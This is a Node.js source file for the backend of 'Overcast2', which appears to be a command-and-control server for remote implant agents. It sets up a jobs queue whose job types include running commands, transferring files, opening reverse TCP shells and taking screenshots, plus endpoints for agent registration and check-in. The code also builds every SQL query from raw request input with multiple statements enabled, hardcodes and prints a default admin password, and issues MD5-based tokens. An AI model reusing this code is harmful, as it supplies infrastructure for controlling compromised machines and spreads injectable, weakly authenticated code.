const bcrypt = require('bcrypt'); // https://www.abeautifulsite.net/hashing-passwords-with-nodejs-and-bcrypt
const mysql = require("mysql")
const fs = require("fs")
const express = require('express')
var url = require('url');
const app = express()
const bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: false })); //Here we are configuring express to use body-parser as middle-ware.
app.use(bodyParser.json());
const crypto = require('crypto')
const SERVER_PORT = 3003
const conf_file = "config.json"
const conf_default_values = '{\n\t"SQLHOST": "localhost",\n\t"SQLUSER": "username",\n\t"SQLPASS": "secretpass",\n\t"SQLDB": "overcast2_db",\n\t"SERVERADMINUSER": "Admin",\n\t"SERVERADMINPASS": "Ov3rC4stPas5_67!"\n}'
const sql_connect_fail = "Unable to Connect to SQL Server"
const sql_connect_success = "successfully Connected to SQL Server"
const auth_time_length = "10"


function ProcessArgs() {
    try {
        args = process.argv.slice(2)
        if (args.length > 0) {
            switch(args[0]) {
                case "--install":
                    InstallOvercastServer()
                    break
            }
        } else {
            StartOvercastServer()
        }
    } catch (error) {
        console.error(error)
    }  
}

function ParseConfig() {
    try {
        if (fs.existsSync(conf_file)) {
            // config file exists so lets parse it
            let rawdata = fs.readFileSync(conf_file);
            const config = JSON.parse(rawdata);
            return config

        } else {
            // No config files so lets create a blank template
            console.log("No Config File Found!")
            console.log("Creating Config File...")
            fs.writeFile(conf_file, conf_default_values, function (err) {
                if (err) {
                    console.log("Unable to Create New Config File")
                    process.exit()
                } else {
                    console.log("New " + conf_file + " Has been created.");
                    console.log("Please fill in " + conf_file + " Then Restart With Install")
                    process.exit()
                }
            });
        }
    } catch (error) {
        console.error(error)
    }
}

function InstallOvercastServer() {
    console.log("\n################################")
    console.log("### OVERCAST2 SERVER INSTALL ###")
    console.log("################################\n")

    // Get Config Details
    console.log("# Reading Config")
    const config = ParseConfig()
    console.log("SQL HOST:     " + config.SQLHOST)
    console.log("SQL USER:     " + config.SQLUSER)
    console.log("SQL PASS:     " + "**********")
    console.log("SQL DATABASE: " + config.SQLDB)
    console.log()

    // Set up database, tables etc...
    try {
        var con = mysql.createConnection({
            host: config.SQLHOST,
            user: config.SQLUSER,
            password: config.SQLPASS,
            multipleStatements: true
        })
        con.connect(function(err) {
            if (err) {
                console.error(err)
                console.log(sql_connect_fail)
                process.exit()
            } else {
                console.log(sql_connect_success)
                // Attempt to drop the database if it already exists
                con.query("DROP DATABASE IF EXISTS " + config.SQLDB + ";", function (err, result) {
                    if (err) {
                        console.error(err);
                        process.exit()
                    } else {
                        console.log("Dropping Database " + config.SQLDB + " if Exists");
                    }
                });
                // Create the database
                con.query("CREATE DATABASE " + config.SQLDB + ";", function (err, result) {
                    if (err) {
                        console.error(err);
                        console.log("Database Creation Failed! Does it Already Exist?");
                        process.exit()
                    } else {
                        console.log("Creating Database: " + config.SQLDB)
                        console.log("Database created");
                    }
                });
                // Create the agents table
                const create_agents_table_sql = "CREATE TABLE " + config.SQLDB + ".agents ( `id` INT NOT NULL AUTO_INCREMENT, `username` varchar(255) DEFAULT NULL, `computer` varchar(255) DEFAULT NULL, `version` varchar(255) DEFAULT NULL, `internal_ip` varchar(255) DEFAULT NULL, `external_ip` varchar(255) DEFAULT NULL, `has_jobs` tinyint(2) NOT NULL DEFAULT 0, `created_at` timestamp NOT NULL DEFAULT current_timestamp(), `checked_in` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(), `registered` tinyint(2) NOT NULL DEFAULT 0, `password` varchar(255) DEFAULT NULL, `handler_url` varchar(255) DEFAULT NULL, `sleep_time_ms` int(100) NOT NULL DEFAULT 3000, `created_by` int(100) NOT NULL DEFAULT 1, `agent_type` int(100) NOT NULL DEFAULT 0, `killed` tinyint(2) NOT NULL DEFAULT 0, primary key (id) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;"
                con.query(create_agents_table_sql, function (err, result) {
                    if (err) {
                        console.log(err)
                    } else {
                        console.log("Creating agents Table")
                        console.log("Table created")    
                    }
                });
                // Create the agent_files table
                const create_agent_files_table_sql = "CREATE TABLE " + config.SQLDB + ".agent_files ( `id` INT NOT NULL AUTO_INCREMENT , `agent_type` INT(100) NOT NULL , `agent_version` VARCHAR(255) NOT NULL , `agent_owner` INT(100) NOT NULL , `agent_b64` TEXT NOT NULL , PRIMARY KEY (`id`)) ENGINE = InnoDB;"
                con.query(create_agent_files_table_sql, function (err, result) {
                    if (err) {
                        console.log(err)
                    } else {
                        console.log("Creating jobs Table")
                        console.log("Table created")
                    }
                });
                // Create the jobs table
                const create_jobs_table_sql = "CREATE TABLE " + config.SQLDB + ".jobs ( `id` INT NOT NULL AUTO_INCREMENT , `agent_id` INT(100) NULL DEFAULT NULL , `job_type` INT(100) NULL DEFAULT NULL , `command` TEXT NULL DEFAULT NULL , `command_response` TEXT NULL DEFAULT NULL , `complete` TINYINT(2) NOT NULL DEFAULT '0' , `job_fetched` TINYINT(2) NOT NULL DEFAULT '0' , `created_at` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP , `updated_at` TIMESTAMP on update CURRENT_TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP , PRIMARY KEY (`id`)) ENGINE = InnoDB;"
                con.query(create_jobs_table_sql, function (err, result) {
                    if (err) {
                        console.log(err)
                    } else {
                        console.log("Creating jobs Table")
                        console.log("Table created")
                    }
                });
                // Create job type table
                const create_job_types_table = "CREATE TABLE " + config.SQLDB + ".job_types ( `id` INT(100) NOT NULL , `name` VARCHAR(255) NOT NULL ) ENGINE = InnoDB;"
                con.query(create_job_types_table, function (err, result) {
                    if (err) {
                        console.log(err)
                    } else {
                        console.log("Creating job_types Table")
                        console.log("Table created")
                    }
                });
                // Populate job types
                /*
                    1 = run command
                    2 = download file
                    3 = upload file
                    4 = reverse tcp shell
                    5 = take screen shot
                    5 = upgrade agent
                */
                const populate_job_types_sql =  "INSERT INTO " + config.SQLDB + ".job_types VALUES (1, 'Run Command');" + 
                                                "INSERT INTO " + config.SQLDB + ".job_types VALUES (2, 'Download File');" +
                                                "INSERT INTO " + config.SQLDB + ".job_types VALUES (3, 'Upload File');" +
                                                "INSERT INTO " + config.SQLDB + ".job_types VALUES (4, 'Reverse TCP Shell');" +
                                                "INSERT INTO " + config.SQLDB + ".job_types VALUES (5, 'Take Screenshot');" + 
                                                "INSERT INTO " + config.SQLDB + ".job_types VALUES (6, 'Upgrade Agent');"
                con.query(populate_job_types_sql, function (err, result) {
                    if (err) {
                        console.log(err)
                    } else {
                        console.log("Inserting Default Values In To job_types Table")
                        console.log("Values created")
                    }
                });     



                // Create agent_types table
                const create_agent_types_table = "CREATE TABLE " + config.SQLDB + ".agent_types ( `id` INT(100) NOT NULL , `agent_type` VARCHAR(255) NOT NULL ) ENGINE = InnoDB;"
                con.query(create_agent_types_table, function (err, result) {
                    if (err) {
                        console.log(err)
                    } else {
                        console.log("Creating agent_types Table")
                        console.log("Table created")
                    }
                });
                //Populate agent_types table
                const populate_agent_types_sql =    "INSERT INTO " + config.SQLDB + ".agent_types VALUES (0, 'Unknown');" + 
                                                    "INSERT INTO " + config.SQLDB + ".agent_types VALUES (1, 'Windows C#');" +
                                                    "INSERT INTO " + config.SQLDB + ".agent_types VALUES (2, 'Powershell');" +
                                                    "INSERT INTO " + config.SQLDB + ".agent_types VALUES (3, 'Python');" +
                                                    "INSERT INTO " + config.SQLDB + ".agent_types VALUES (4, 'Kotlin');" + 
                                                    "INSERT INTO " + config.SQLDB + ".agent_types VALUES (4, 'Java');"
                con.query(populate_agent_types_sql, function (err, result) {
                    if (err) {
                        console.log(err)
                    } else {
                        console.log("Inserting Default Values In To job_types Table")
                        console.log("Values created")
                    }
                });    







                // Create users table         
                const create_users_table = "CREATE TABLE " + config.SQLDB + ".users ( `id` INT NOT NULL AUTO_INCREMENT , `username` VARCHAR(255) NOT NULL, `password` VARCHAR(255) NOT NULL , `role` INT(100) NOT NULL DEFAULT 9 ,UNIQUE(username), PRIMARY KEY (`id`)) ENGINE = InnoDB;"                 
                con.query(create_users_table, function (err, result) {
                    if (err) {
                        console.log(err)
                    } else {
                        console.log("Creating users Table")
                        console.log("Table created")
                    }
                });
                // Insert admin user by default
                hash = bcrypt.hashSync(config.SERVERADMINPASS, 10);
                const insert_admin_user = "INSERT INTO " + config.SQLDB + ".users VALUES (null, '" + config.SERVERADMINUSER + "', '" + hash + "', 1);"
                con.query(insert_admin_user, function (err, result) {
                    if (err) {
                        console.log(err)
                    } else {
                        console.log("Inserting Admin Values In To users Table")
                        console.log("Account created with credentials (Admin / " + config.SERVERADMINPASS + ")")
                    }
                });

                // Create the auth_tokens table
                const create_auth_tokens_table_sql = "CREATE TABLE " + config.SQLDB + ".auth_tokens ( `id` INT NOT NULL AUTO_INCREMENT , `user_id` INT(100) NULL DEFAULT NULL , `auth_token` VARCHAR(255) NOT NULL , `auth_token_expire` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP , PRIMARY KEY (`id`)) ENGINE = InnoDB;"
                con.query(create_auth_tokens_table_sql, function (err, result) {
                    if (err) {
                        console.log(err)
                    } else {
                        console.log("Creating auth_tokens Table")
                        console.log("Table created")
                    }
                });

                con.end()
            }
        })
    } catch (error) {
        console.log(error)
        console.log(sql_connect_fail)
        process.exit()
    }   
}




function StartOvercastServer() {
    console.log("\n################################")
    console.log("###     OVERCAST2 SERVER     ###")
    console.log("################################\n")

    console.log("Attempting to Start Overcast Server...")

    const config = ParseConfig()

    
    
    // ## Get Root ###
    app.get("/", (req, res) =>{
        // The agents always run this before any other function to check that server is up.
        // So lets use this to continuesly delete old data such as expired tokens
        try {
            var con = mysql.createConnection({
                host: config.SQLHOST,
                user: config.SQLUSER,
                password: config.SQLPASS,
                database: config.SQLDB,
                multipleStatements: true
            })
            con.connect(function(err) {
                if (err) {
                    console.log("Unable to connect to SQL for deleting old tokens")
                }
                // First Test That They Have an Auth Token
                sql = "DELETE FROM `auth_tokens` WHERE auth_token_expire < current_timestamp();"
                con.query(sql, function (err, result, fields) {
                    if (err) {
                        console.log("Unable to delete old tokens")
                    }
                });
            });
        } catch (error) {
            console.log("Unable to delete old tokens")
        }


        // Actual get / code
        console.log("Requested /")
        const response =    {Online: true}
        res.json(response)
    })

    
    // ### Agents ### 

    // GET - Get Agent Details with user and pass
    app.get("/agents/byid", (req, res) =>{
        console.log("Requested To Get Agent By ID")
        try {
            var url_parts = url.parse(req.url, true);
            var auth = url_parts.query;
            var user_id = auth.user_id
            var auth_token = auth.auth_token
            var agent_id = auth.agent_id

            var con = mysql.createConnection({
                host: config.SQLHOST,
                user: config.SQLUSER,
                password: config.SQLPASS,
                database: config.SQLDB,
                multipleStatements: true
            })
            con.connect(function(err) {
                if (err) {
                    res.json({id: 0})
                }
                // First Test That They Have an Auth Token
                sql = "SELECT * FROM `auth_tokens` WHERE auth_token = '" + auth_token + "' AND user_id = " + user_id + " AND auth_token_expire > current_timestamp();"
                con.query(sql, function (err, result, fields) {
                if (err) {
                    res.json({id: 0})
                } else {
                    if (result.length > 0) {
                            // Passed auth so lets do stuff
                            sql = "SELECT * FROM `agents` WHERE id = '" + agent_id + "' AND created_by = " + user_id + " LIMIT 1;"
                            con.query(sql, function (err, result, fields) {
                                if (err) {
                                    res.json({id: 0})
                                } else {
                                    res.json(result[0])
                                }
                            });
                            
                            con.end()
                    } else {
                        res.json({id: 0})
                    }
                }
                });
            });
        } catch (error) {
            res.json({agentId: 0})
        }
    })

    // POST - Initial Agent Registration that will return its agent ID
    app.post('/agents', (req, res) => {
        console.log("Requested To Register Agent")
        try {
            var auth_token = req.body.auth_token
            var user_id = req.body.created_by
            var con = mysql.createConnection({
                host: config.SQLHOST,
                user: config.SQLUSER,
                password: config.SQLPASS,
                database: config.SQLDB,
                multipleStatements: true
            })
            con.connect(function(err) {
                if (err) {
                    res.json({agentId: 0})
                }
                // First Test That They Have an Auth Token
                sql = "SELECT * FROM `auth_tokens` WHERE auth_token = '" + auth_token + "' AND user_id = " + user_id + " AND auth_token_expire > current_timestamp();"
                con.query(sql, function (err, result, fields) {
                if (err) {
                    res.json({agentId: 0})
                } else {
                    if (result.length > 0) {
                            hash = bcrypt.hashSync(req.body.password, 10);
                            var sql = "INSERT INTO `agents` (`id`, `username`, `computer`, `version`, `internal_ip`, `external_ip`, `has_jobs`, `created_at`, `checked_in`, `registered`, `password`, `handler_url`, `sleep_time_ms`, `created_by`, `agent_type`, `killed`) VALUES (NULL, '" + req.body.username + "', '" + req.body.computer + "', '" + req.body.version + "', '" + req.body.internal_ip + "', '" + req.body.external_ip + "', '0', current_timestamp(), current_timestamp(), '1', '" + hash + "', '" + req.body.handler_url + "', '" + req.body.sleep_time_ms + "', '" + req.body.created_by + "', '" + req.body.agent_type + "', '" + req.body.killed + "');";
                            con.query(sql, function (err, result) {
                                if (err) throw err;
                                res.json({agentId: result.insertId}) 
                            });
                            con.end()
                    } else {
                        res.json({agentId: 0})
                    }
                }
                });
            });
        } catch (error) {
            res.json({agentId: 0})
        }
    });

    // PUT - Used For Repeat Agent Updates
    app.put('/agents', (req, res) => {
        console.log("Requested To Update Agent Detials")
        try {
            var auth_token = req.body.auth_token
            var user_id = req.body.created_by
            var con = mysql.createConnection({
                host: config.SQLHOST,
                user: config.SQLUSER,
                password: config.SQLPASS,
                database: config.SQLDB,
                multipleStatements: true
            })
            con.connect(function(err) {
                if (err) {
                    res.json({agentId: 0})
                }
                // First Test That They Have an Auth Token
                sql = "SELECT * FROM `auth_tokens` WHERE auth_token = '" + auth_token + "' AND user_id = " + user_id + " AND auth_token_expire > current_timestamp();"
                con.query(sql, function (err, result, fields) {
                if (err) {
                    res.json({updated: 0})
                } else {
                    if (result.length > 0) {
                        var sql = "UPDATE `agents` SET `username` = '" + req.body.username + "', `computer` = '" + req.body.computer + "', `version` = '" + req.body.version + "', `internal_ip` = '" + req.body.internal_ip + "', `external_ip` = '" + req.connection.remoteAddress + "', `checked_in` = current_timestamp() WHERE `agents`.`id` = " + req.body.id + ";";
                        con.query(sql, function (err, result) {
                            if (err) {
                                res.json({updated: 0})
                            } else {
                                res.json({updated: 1})
                            }
                        });
                        con.end()
                    } else {
                        res.json({updated: 0})
                    }
                }
                });
            });
        } catch (error) {
            res.json({updated: 0})
        }
    });
    

    // ### Jobs
    app.get("/jobs/byagentid", (req, res) =>{
        console.log("Requested To Get Jobs By Agent ID")
        try {
            var url_parts = url.parse(req.url, true);
            var auth = url_parts.query;
            var user_id = auth.user_id
            var auth_token = auth.auth_token
            var agent_id = auth.agent_id

            var con = mysql.createConnection({
                host: config.SQLHOST,
                user: config.SQLUSER,
                password: config.SQLPASS,
                database: config.SQLDB,
                multipleStatements: true
            })
            con.connect(function(err) {
                if (err) {
                    res.json({id: 0})
                }
                // First Test That They Have an Auth Token
                sql = "SELECT * FROM `auth_tokens` WHERE auth_token = '" + auth_token + "' AND user_id = " + user_id + " AND auth_token_expire > current_timestamp();"
                con.query(sql, function (err, result, fields) {
                if (err) {
                    res.json({id: 0})
                } else {
                    if (result.length > 0) {
                            // Passed auth so lets do stuff
                            sql = "SELECT * FROM `agents` WHERE id = '" + agent_id + "' AND created_by = " + user_id + " LIMIT 1;"
                            con.query(sql, function (err, result, fields) {
                                if (err) {
                                    res.json({id: 0})
                                } else {
                                    res.json(result[0])
                                }
                            });
                            
                            con.end()
                    } else {
                        res.json({id: 0})
                    }
                }
                });
            });
        } catch (error) {
            res.json({agentId: 0})
        }
    })







    // ### Auth ###

    app.get("/auth/check", (req, res) =>{
        try {
            console.log("Requested To Check Authed")
            var url_parts = url.parse(req.url, true);
            var auth = url_parts.query;
            var user_id = auth.user_id
            var auth_token = auth.auth_token
            var con = mysql.createConnection({
                host: config.SQLHOST,
                user: config.SQLUSER,
                password: config.SQLPASS,
                database: config.SQLDB,
                multipleStatements: true
            })
            con.connect(function(err) {

                if (err) {
                    console.log("Check Auth Not Authenticated")
                    var response =    {authenticated: false}
                    res.send(response)
                }
                sql = "SELECT * FROM `auth_tokens` WHERE auth_token = '" + auth_token + "' AND user_id = " + user_id + " AND auth_token_expire > current_timestamp();"
                
                con.query(sql, function (err, result, fields) {
                if (err) {
                    console.log("Check Auth Not Authenticated")
                    var response =    {authenticated: false}
                    res.json(response)
                } else {
                    if (result.length > 0) {
                        console.log("Check Auth Authenticated")
                        var response =    {authenticated: true}
                        res.json(response)
                    } else {
                        console.log("Check Auth Not Authenticated")
                        var response =    {authenticated: false}
                        res.json(response)
                    }
                }
                });
            });
        } catch (error) {
            console.log("Check Auth Not Authenticated")
            var response =    {authenticated: false}
            res.json(response)
        }
    })

    app.get("/auth", (req, res) =>{
        var url_parts = url.parse(req.url, true);
        var auth = url_parts.query;
        username = auth.username
        password = auth.password
        console.log("Requested To Auth User: " + username)
        var con = mysql.createConnection({
            host: config.SQLHOST,
            user: config.SQLUSER,
            password: config.SQLPASS,
            database: config.SQLDB,
            multipleStatements: true
        })
        con.connect(function(err) {
            
            if (err) throw err;
            var sql = "SELECT * FROM users WHERE username = '" + username + "' LIMIT 1"
            con.query(sql, function (err, result) {
                if (err) throw err;
                if (result.length > 0) {
                    if(bcrypt.compareSync(password, result[0].password)) {
                        // Authenticated so lets add an auth token to the auth token table that expires in 10 mins
                        // Using the DB name, the Username and the current time should create a unique key
                        var auth_token = crypto.createHash('md5').update(config.SQLDB + Date.now() + username).digest("hex")
                        var insert_auth_token = "INSERT INTO " + config.SQLDB + ".auth_tokens VALUES (null, " + result[0].id + ", '" + auth_token + "', current_timestamp() + INTERVAL " + auth_time_length +" MINUTE);"
                        con.query(insert_auth_token, function (err, result2) {
                            if (err) {
                                console.log(username + " Authentication Failed")
                                res.send({authenticated: false})
                            } else {
                                console.log(username + " Authenticated")
                                res.send({authenticated: true, id: result[0].id, username: result[0].username, role: result[0].role, auth_token: auth_token})
                            }
                        });
                    } else {
                        console.log(username + " Authentication Failed")
                        res.send({authenticated: false})
                    }
                } else {
                    console.log(username + " Authentication Failed")
                    res.send({authenticated: false})
                }
            });
        });   
    })







    app.listen(SERVER_PORT, () => {
        console.log("Server Has Started on Port " + SERVER_PORT)
    })
}


ProcessArgs()

